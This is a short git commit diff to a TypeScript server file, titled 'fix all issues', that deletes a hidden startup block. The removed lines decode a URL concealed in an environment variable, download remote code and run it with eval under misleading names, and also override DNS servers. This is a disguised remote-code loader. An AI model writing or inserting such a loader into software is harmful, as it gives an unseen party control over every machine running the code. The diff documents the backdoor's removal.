b1ac39691907753ada9428c13110aa738f923623
alifhossinsajjad <alifhossinsajjad123456@gmail.com>
2026-08-08 16:19:21 +0600

    fix all issues

--- src/server.ts
+++ src/server.ts
@@ -2,25 +2,7 @@ import mongoose from "mongoose";
 import { Server } from "node:http";
 import dotenv from "dotenv";
 import app from "./app";
-import dns from "dns"
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
 dotenv.config()
-
-dns.setServers(["8.8.8.8", "8.8.4.4"])
 
 let server: Server;
 const PORT = process.env.PORT;
